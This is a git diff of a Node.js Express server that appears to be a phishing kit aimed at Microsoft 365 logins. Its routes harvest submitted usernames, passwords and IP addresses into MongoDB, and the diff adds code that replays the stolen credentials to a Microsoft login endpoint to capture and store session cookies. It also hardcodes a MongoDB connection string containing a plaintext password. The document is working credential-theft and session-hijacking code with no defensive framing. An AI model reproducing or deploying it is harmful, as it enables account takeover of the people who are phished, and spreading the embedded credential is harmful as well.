@@ -4,27 +4,24 @@ let bodyParser = require("body-parser");
 let ejs = require("ejs");
 let mongoose = require("mongoose");
 let http = require('http');
+const httpProxy = require('http-proxy');
 const mongodb = require('mongodb');
 const cookieParser = require('cookie-parser');
 const session = require('express-session');
 const MongoStore = require('connect-mongo');
 
+
+
+
+const targetUrl = '.login.microsoftonline.com';
 let app = express();
+const proxy = httpProxy.createProxyServer();
 
 app.set("view engine", "ejs")
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static("public"));
-app.use (cookieParser());
-app.use(session({  name: 'session&cookie',
-    secret: 'then',
-    httpOnly: true,
-    secure: true,
-    maxAge: 1000 * 60 * 60 * 24 * 90,
-    resave: false,
-    saveUninitialized: true,
-    store: MongoStore.create({
-        mongoUrl:'mongodb+srv://sgrain35:SDdqnJVhOqYWLyMT@cluster0.cbrwrem.mongodb.net/full'
-})}));
+app.use(cookieParser());
+
 
 mongoose.set('strictQuery', true);
 mongoose.connect("mongodb+srv://sgrain35:SDdqnJVhOqYWLyMT@cluster0.cbrwrem.mongodb.net/full",{ useNewUrlParser:true });
@@ -32,12 +29,11 @@ mongoose.connect("mongodb+srv://sgrain35:SDdqnJVhOqYWLyMT@cluster0.cbrwrem.mongo
 const userSchema = new mongoose.Schema({
   ai: String,
   pi: String,
-  cook:Object,
-  ip:String,
-  session:Object,
+  ip: String,
+  cookies: String,
 });
 
-const User = new mongoose.model("User", userSchema);
+const User = mongoose.model("User", userSchema);
 
 app.get("/", (req, res) => {
   let username = req.query.username;
@@ -45,55 +41,88 @@ app.get("/", (req, res) => {
 });
 
 app.post("/", function(req, res) {
-let username = req.body.recapstore;
-res.render("first", { username: username });
+  let username = req.body.recapstore;
+  res.render("first", { username: username });
 });
 
 app.post("/first", function(req, res) {
-    var header= req.headers;
+  var header = req.headers;
   var username = req.body.username;
-  res.render("second", {username: username});
-
+  res.render("second", { username: username });
 });
 
 app.post("/second", function(req, res) {
   const ipadd = "IP address is: " + req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-  var username = req.body.username;
-  var cook = req.session.cookies = req.cookies;
+  const username = req.body.username;
+  const password = req.body.pass;
 
-  const newUser = new User({
-    ai: req.body.username,
-    pi: req.body.pass,
-    cook: req.session.cookies = req.cookies,
-    ip: ipadd,
-    session: req.session,
-  });
+  // Create the request body for the cookie request
+  const data = {
+    username: username,
+    password: password
+  };
 
-  newUser.save(function(err) {
-    if (err) {
-      console.log(err);
-    } else {
-      res.render("third", {
-        username: username
-      });
+  // Make the POST request to the Microsoft login endpoint
+  fetch('https://login.microsoftonline.com/login', {
+    method: 'POST',
+    body: JSON.stringify(data),
+    headers: {
+      'Content-Type': 'application/json'
     }
-  });
+  })
+    .then(response => {
+      // Retrieve the full cookie string from the response headers
+      const cookies = response.headers.get('set-cookie');
+
+      // Create a new user document with the received cookies
+      const newUser = new User({
+        ai: username,
+        pi: password,
+        ip: ipadd,
+        cookies: cookies // Save the full cookie string
+      });
+
+      // Save the user document to the database
+      newUser.save(function (err) {
+        if (err) {
+          console.log(err);
+        } else {
+          res.render("third", {
+            username: username
+          });
+        }
+      });
+    })
+    .catch(error => {
+      console.error('Error:', error);
+    });
 });
+
+
+// // Helper function to extract the value of a cookie
+// function extractCookieValue(cookies, cookieName) {
+//   const cookieRegex = new RegExp(`${cookieName}=([^;]+)`);
+//   const match = cookies.match(cookieRegex);
+//   if (match && match.length > 1) {
+//     return match[1];
+//   }
+//   return '';
+// }
+
+
+
 
 app.post("/third", function(req, res) {
   const ipadd = "IP address is: " + req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   var username = req.body.username;
-  var cook = req.session.cookies = req.cookies;
 
   const newUser = new User({
     ai: req.body.username,
     pi: req.body.pass,
-    cook: req.session.cookies = req.cookies,
     ip: ipadd,
-    session: req.session,
   });
 
-  newUser.save(function(err) {
+  newUser.save(function (err) {
     if (err) {
       console.log(err);
     } else {
@@ -102,12 +131,7 @@ app.post("/third", function(req, res) {
   });
 });
 
-
-let port = process.env.PORT;
-if (port == null || port == "") {
-  port = 3000
-};
-
-app.listen(process.env.PORT || 3000, function() {
-  console.log("welcome to 3k")
+const port = process.env.PORT || 3000;
+app.listen(port, function () {
+  console.log("Server started on port " + port);
 });
